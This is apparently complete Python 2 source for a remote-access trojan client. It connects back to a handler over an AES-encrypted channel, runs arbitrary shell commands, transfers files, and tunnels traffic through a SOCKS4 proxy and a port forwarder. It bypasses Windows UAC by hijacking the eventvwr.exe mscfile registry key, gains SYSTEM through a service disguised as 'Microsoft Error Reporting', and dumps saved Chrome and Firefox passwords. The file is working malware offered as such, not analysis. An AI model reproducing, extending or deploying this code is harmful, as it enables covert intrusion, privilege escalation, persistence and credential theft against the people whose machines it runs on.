import socket
import Queue
import subprocess
import os
import threading
import logging
import time
import psutil
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib
import getpass
import ctypes
import sys

if os.name == "nt":
	import passdump
	import win32net

	
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

def windows_only(func):
	"""
	This decorator can be used to mark functions that will only work on Windows.
	"""
	def tester(*args):
		if os.name != "nt": return "Command not available on non-windows OS."
		else: return func(*args)
	return tester

class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force. All threads should get a handle to themselves using threading.currentThread(), then check the stopped() flag every loop.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	A channel is essentially two queues, one for inputting data into a thread, one for getting the output. Each channel is identified by a single byte prepended to the data. Usually, data is fed into the chanel by a thread that receives it from the handler, and read from the output by another thread which sends it back.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		self.stale = False
		
		logging.debug("Channel created with ID "+str(ord(self.id)))
		
	def write_input(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
		self.input_queue.put(data)
		
	def read_input(self, blocking=True):
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
			return data
		except Queue.Empty: return None
		
	def write_output(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
		self.output_queue.put(self.id+data)
		
	def signal(self, data):
		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data)
		self.output_queue.put(chr(254)+data)
		
	def __repr__(self):
		return "Channel ID: "+str(ord(self.id))
		
	def __str__(self):
		return self.__repr__()
		
class ProxyConnection:
	"""
	This class is used to create a socksv4 proxy, to forward connections from the handler's to shell's network.
	"""
	def __init__(self, channel):
		self.channel = channel
		self.disconnected = False
		logging.info("Creating new proxy connection. "+repr(self.channel))
		self.disconnected = False
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		logging.debug("Proxy connection starting.")
		data = self.channel.read_input()
		version, type, remote_port, remote_host, user_id = ord(data[0]), ord(data[1]), data[2:4], data[4:8], data[8:-1]
		if version != 4 or type != 1:
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return
			
		port1, port2 = ord(remote_port[0]), ord(remote_port[1])
		self.remote_port = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		self.remote_host = ".".join([str(ord(remote_host[i])) for i in range(4)])
		
		self.remote_socket = socket.socket()
		self.remote_socket.settimeout(20)
		self.connect()
		
	def send(self, data):
		self.channel.write_output(data)
		
	def connect(self):
		try:
			logging.info("Proxy connection on channel #"+str(self.channel.id)+": Connecting to "+str(self.remote_host)+":"+str(self.remote_port)+"...")
			self.remote_socket.connect((self.remote_host, self.remote_port))
			logging.info("Connection successful!")
			self.remote_socket.settimeout(None)
		except:
			logging.info("Connection failed.")
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return

		self.send("\x00\x5A\x00\x00\x00\x00\x00\x00")
		self.relay()
		
	def reader(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.remote_socket.recv(8192)
			if not data:
				self.disconnected = True
				self.channel.stale = True
				return
			self.send(data)
			
	def writer(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.channel.read_input()
			self.remote_socket.sendall(data)
		
	def relay(self):
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
class PortForwarder:
	"""
	This is the reverse of the socks proxy. Instead of talking the socksv4 protocol, it simply binds to a local port and forwards all data to a host specified on creation, proxying it through the handler.
	"""
	def __init__(self, channel, bind_port):
		self.channel = channel # TODO: Make it accept multiple connections!!!!!!
		self.bind_port = bind_port
		self.bind_sock = socket.socket()
		self.disconnected = False
		
		self.bind_sock.bind(("0.0.0.0", self.bind_port))
		self.bind_sock.listen(1)
		
		t = StoppableThread(target=self.run)
		t.daemon = True
		t.start()
		
	def run(self):
		self.client_socket, addr = self.bind_sock.accept()
		
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
		
	def reader(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.client_socket.recv(8192)
			if not data:
				self.disconnected = True
				self.channel.stale = True
				return
			self.send(data)
			
	def writer(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.channel.read_input()
			self.client_socket.sendall(data)

		
	
class Transport:
	""""
	Transport handles connecting to the handler, managing channels, and communicating with the handler. One thread receives data, checks which channel it should be forwarded to, and puts it on the correct queue. Another gets data from a queue all channels write to, and sends it to the handler.
	"""
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
		self.master_queue = Queue.Queue()
		self.user_channel = Channel(chr(97), self.master_queue)
		self.signal_channel = Channel(chr(254), self.master_queue)
		
		self.disconnected = False
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}

		
	def connect(self):
		logging.info("Attempting to connect to "+self.handler_ip+":"+str(self.handler_port))
		try:
			self.comm_socket.connect((self.handler_ip, self.handler_port))
			logging.info("Connected!")
			self.comm_socket.sendall(chr(255)*30)
			time.sleep(random.randint(100,500)/100) # Waiting a random amount of time since multiple clients
			self.aes_obj = self.dh_exchange() # connecting at the exact same time causes the handler to hang
			
			data = socket.gethostname()+"|"+str(misc.isadmin())
			
			self.comm_socket.sendall(data)
			
			for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
				t = StoppableThread(target=f)
				t.daemon = True
				t.start()
				
			return True
		except Exception as e:
			logging.warn("Failed to connect to handler: "+str(e))
			return False
			
	def dh_exchange(self):
		"""
		This function sets up a secure connection with the handler using the Diffie-Hellman Exchange.
		"""
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1) # Generate a number 255 digits long
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)
			
	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data+chr(255))
		except: pass # If we can't send data, the recv function probably already noticed the connection died, and will restart everything soon.
		
	def recv(self):
		if self.disconnected: return ""
		
		try:
			data = ""
			while not data.endswith(chr(255)):
				data += self.comm_socket.recv(4096)
			data = data[:-1]
		except: data = ""
		
		if not data:
			logging.error("Handler disconnected")
			self.comm_socket.close()
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to handler: "+data[1:])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from handler: "+data.strip())
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal)
			if signal.startswith("CREATE_CHANNEL"):
				self.create_channel(signal.split(":")[1])
			elif signal.startswith("CREATE_PROXY"):
				ProxyConnection(self.channels[signal.split(":")[1]])
			elif signal.startswith("DOWNLOAD_FILE"):
				junk, channel, file = signal.split(":")
				channel = self.channels[channel]
				fs.download(file, channel)
			elif signal.startswith("UPLOAD_FILE"):
				junk, channel, file = signal.split(":")
				channel = self.channels[channel]
				fs.upload(file, channel)
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)
		
class Execute:
	"""
	Functions related to executing programs.
	"""
	def __init__(self):
		self.killed = False
		
	def kill_proc(self, pid):
		logging.warn("Killing command after taking over a minute to execute.")
		process = psutil.Process(pid)
		for proc in process.children(recursive=True): # Kill the children first so the parent has to suffer
			proc.terminate()
		process.terminate()
		self.killed = True
		
	def execute_shell_command(self, command):
		"""
		The core of the whole shell, this function executes shell commands. If the process takes longer than 60 seconds to return, it is killed, and the user is notified about it.
		"""
		logging.info("Executing shell command: "+command.strip())
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		timer = threading.Timer(60, self.kill_proc, [proc.pid])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		if self.killed: out += "\n(Process terminated after taking too long to execute)"
		timer.cancel()
		self.killed = False
		logging.debug("Result of shell command: "+out.strip())
		return proc.returncode, out
		
class Filesystem:
	"""
	Functions related to interacting with the file system.
	"""
	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
			
	def download(self, path, channel):
		logging.info("Starting download of file: "+path)
		try:
			with open(path, "rb") as f:
				while True:
					data = f.read(8192)
					if not data: break
					channel.write_output(data)
					time.sleep(0.1) # Sleep, otherwise some data will be missing and jumbled
			time.sleep(2)
			ch.write_output(chr(255)*50)
			time.sleep(5)
		except Exception as e:
			channel.write_output("Error: "+str(e))
			
	def upload(self, path, channel):
		logging.info("Starting upload of file: "+path)
		
		with open(path, "wb") as f:
			while True:
				data = channel.read_input()
				if data.endswith(chr(255)): break
				f.write(data)
			logging.info("Upload complete.")
			
class Miscellaneous:
	"""
	Miscellaneous functions that don't fit into any other category.
	"""
	def isadmin(self):
		if os.name == "nt": return ctypes.windll.shell32.IsUserAnAdmin() != 0
		else: return os.geteuid() == 0
		
	def ASCIIfy(self, string):
		return ''.join([i if ord(i) < 128 else '' for i in string])
		
	@windows_only
	def is_user_in_group(self, group, member):
		members = win32net.NetLocalGroupGetMembers(None, group, 1)
		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
		return False
	 
	@windows_only
	def name_of_admin_group(self):
		for line in execute.execute_shell_command("whoami /groups")[1].splitlines():
			if "S-1-5-32-544" in line: # S-1-5-32-544 is a well-known identifier for the admin group
				return line.split()[0].split("\\")[1]
		
class Privilege_Escalation:
	"""
	Functions related to escalating privileges.
	"""
	@windows_only
	def bypass_uac(self):
		logging.info("Attempting to bypass UAC.")
		if misc.isadmin():
			logging.debug("UAC bypass failed: Process already has admin privileges.")
			return "[*]You already have admin privileges!" # Check your privilege!
		 
		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
			logging.debug("UAC bypass failed: Current user is not part of admin group.")
			return "[-]Current user is not part of admin group."
		 
		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin")[1].split()[3] == "0x5":
			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
			return "[-]UAC is disabled or notification policy is set to 'Always'"
			
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
		os.startfile("eventvwr.exe") # Eventvwr is a program that autoelevates and also runs a program specified in a certain registry key.
		time.sleep(2)
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		return "BG_NEW_SESH"
		
	@windows_only
	def create_service(self, path, name):
		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto")[0] != 0:
			return False
		if execute.execute_shell_command("sc start "+name)[0] != 0: # TODO: check why this is broken
			return False
		return True
		
	@windows_only
	def remove_service(self, name):
		execute.execute_shell_command("sc delete "+name)
		
	@windows_only
	def get_system(self):
		if not misc.isadmin(): return "[-]You need admin privileges to get system." # Check your privilege! (That was funny the first time)
		self.create_service(os.path.abspath(sys.executable), '"Microsoft Error Reporting"')
		return "BG_NEW_SESH"
		
		
class Information_Gathering:
	"""
	Functions related to gathering data from the system.
	"""
	@windows_only
	def dump_chrome(self):
		return passdump.dump_chrome()
		
	@windows_only
	def dump_firefox(self):
		return passdump.dump_firefox()
		
	
		
execute = Execute()
fs = Filesystem()
misc = Miscellaneous()
privesc = Privilege_Escalation()
info = Information_Gathering()
	
class Shell:
	"""
	The shell class receives commands input by the user and acts accordingly.
	"""
	def __init__(self, transport):
		self.transport = transport
		self.channel = self.transport.user_channel
		
	def run(self):
		if not self.transport.connect(): return False
		
		while True:
			data = self.recv()
			if data == "CONN_LOST":
				return False
			elif data.startswith("cd"):
				data = data[3:]
				output = fs.change_directory(data.strip())
			elif data == "isadmin":
				output = str(misc.isadmin())
			elif data == "bypassuac":
				output = privesc.bypass_uac()
			elif data == "dumpchrome":
				output = info.dump_chrome()
			elif data == "dumpff":
				output = info.dump_firefox()
			elif data == "die":
				os._exit(0)
			elif data == "getsystem":
				output = privesc.get_system()
			elif data.startswith("download"):
				file = data.split()[1]
				output = fs.download(file, self.transport)
			else:
				output = execute.execute_shell_command(data)[1]
				
			self.send(str(output)+"\n"+os.getcwd()+">>")
		
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
			
def main():
	while True:
		shell = Shell(Transport("127.0.0.1",8080))
		if not shell.run():
			del shell
			for t in threading.enumerate():
				try: t.stop() # RED LIGHT
				except: pass
			time.sleep(5)
			
if __name__ == "__main__":
	main()